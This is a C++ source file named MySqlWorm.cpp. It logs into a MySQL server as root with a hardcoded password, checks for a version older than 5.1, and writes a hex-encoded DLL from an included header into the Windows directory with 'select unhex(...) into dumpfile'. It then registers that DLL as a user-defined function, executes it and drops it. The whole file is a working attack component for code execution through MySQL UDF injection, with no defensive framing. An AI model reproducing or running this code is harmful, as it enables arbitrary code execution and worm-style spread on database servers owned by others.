// MySqlWorm.cpp : Defines the entry point for the console application.
//

#include <stdio.h>
#include <WINDOWS.H>
#include <tchar.h>
#include <io.h>
#include <time.h>
#include "mysql.h"
#include "hex_code.h"

#pragma comment(lib,"libmysql.lib")

MYSQL mysql;
void wait()
{
	MSG msg;
	while (GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

BOOL doQuery(char *result,char *query)
{
	MYSQL_RES *res;
	MYSQL_ROW row;
	unsigned int i;

	if (mysql_real_query(&mysql,query,(unsigned int)strlen(query)) != 0)
	{
		fprintf(stderr,"Query Failed,Error: %s\n",mysql_error(&mysql));
		return FALSE;
	}

	if (res = mysql_store_result(&mysql))
	{
		while (row = mysql_fetch_row(res))
		{
			for (i = 0;i < mysql_num_fields(res);i++)
			{
				printf("%s ",row[i]);
			}
			printf("\n");
		}
		mysql_free_result(res);
	}
	else if (mysql_errno(&mysql))
	{
		fprintf(stderr,"Get result,Error: %s\n",mysql_error(&mysql));
		return FALSE;
	}
	else printf("Query Success.\n");
		

	return TRUE;
}

void gen_random(char *s, const int len) 
{
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	int i;
	srand((unsigned)time(0));

	for (i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

#define QUERY_LENGTH (102400)
int _tmain(int argc, _TCHAR* argv[])
{
	char *query = (char *)malloc(QUERY_LENGTH);
	char name[10] = {0};
	gen_random(name,8);
	ZeroMemory(query,QUERY_LENGTH);
	mysql_init(&mysql);
	__try
	{
		char result[1024] = {0};
		unsigned long version;

		if (!mysql_real_connect(&mysql,
			"127.0.0.1",		// host
			"root",				// user
			"cc",				// password
			NULL,				// db name, NULL = default
			0,					// port, 0 = default
			NULL,				// unix_socket, use socket or pipe if not NULL
			0))					// normally 0	
		{
			fprintf(stderr,"Failed to connect to database: Error: %s\n",mysql_error(&mysql));
			__leave;
		}

		version = mysql_get_server_version(&mysql);
		if (version)
		{
			int major_version = version / 10000;
			int minor_version = (version % 10000) / 100;
			if (major_version >= 5 && minor_version >= 1)
			{
				fprintf(stderr,"MySql Version too high, not support!");
				__leave;
			}
		}

		printf("Uploading udf dll file...\n");
		sprintf_s(query,QUERY_LENGTH,"select unhex('%s') into dumpfile 'c:/windows/%s.dll'",hex_code,name);
		if (!doQuery(result,query))
			__leave;

		printf("Select database 'mysql'...\n");
		if (!doQuery(result,"use mysql"))
			__leave;

		printf("Creating udf function...\n");
		sprintf_s(query,QUERY_LENGTH,"create function myfunc_test returns integer soname '%s.dll'",name);
		if (!doQuery(result,query))
			__leave;

		printf("Run udf function...\n");
		if (!doQuery(result,"select myfunc_test()"))
			printf("Run udf function failed...!\n");

		printf("drop udf function...\n");
		if (!doQuery(result,"drop function myfunc_test"))
			__leave;
	}
	__finally
	{
		mysql_close(&mysql);
		mysql_library_end();
		free(query);
	}

	wait();
	return 0;
}

